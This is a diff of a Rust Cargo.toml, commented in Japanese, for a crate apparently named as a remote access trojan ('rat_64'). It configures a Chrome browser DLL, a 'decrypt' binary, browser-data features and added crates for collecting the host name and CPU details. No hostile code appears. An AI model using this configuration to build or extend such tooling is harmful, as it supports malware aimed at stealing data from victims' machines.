@@ -21,6 +21,8 @@ overflow-checks = false
 incremental = false
 debug = false
 rpath = false
+# 最適化強化
+split-debuginfo = "off"
 
 [profile.dev]
 opt-level = 1
@@ -40,21 +42,18 @@ debug = false
 rpath = false
 overflow-checks = false
 debug-assertions = false
+# 超小型化設定
+split-debuginfo = "off"
 
 [lib]
 name = "rat_64"
 path = "src/lib.rs"
-crate-type = ["cdylib", "rlib"]
 
 # ChromeBrowserDLL specific configuration
 [package.metadata.chrome_browser_dll]
 name = "chrome_browser_dll"
 path = "src/chrome_browser_dll.rs" 
 crate-type = ["cdylib"]
-
-[[bin]]
-name = "rat_64"
-path = "src/main.rs"
 
 [[bin]]
 name = "decrypt"
@@ -108,6 +107,9 @@ hyper = { version = "1", features = ["server", "http1"] }
 hyper-util = { version = "0.1", features = ["tokio"] }
 http-body-util = "0.1"
 bytes = "1"
+encoding_rs = "0.8.35"
+hostname = "0.4"  # ホスト名取得用
+num_cpus = "1.0"  # CPU情報取得用
 
 # ---- Feature設定（統一・最適化済み） ----
 [features]
@@ -131,8 +133,7 @@ ui-minimal = []                                           # UI要素を最小化
 crypto-minimal = []                                       # 暗号化機能を最小化
 size-optimized = ["ui-minimal", "crypto-minimal"]        # 総合サイズ最適化
 
-# データベース機能（browserのエイリアス、後方互換性のため）
-database = ["browser"]
+# 重複削除：database = browserのエイリアスは不要
 
 # 機能グループ（段階的構成）
 basic = ["core", "browser"]
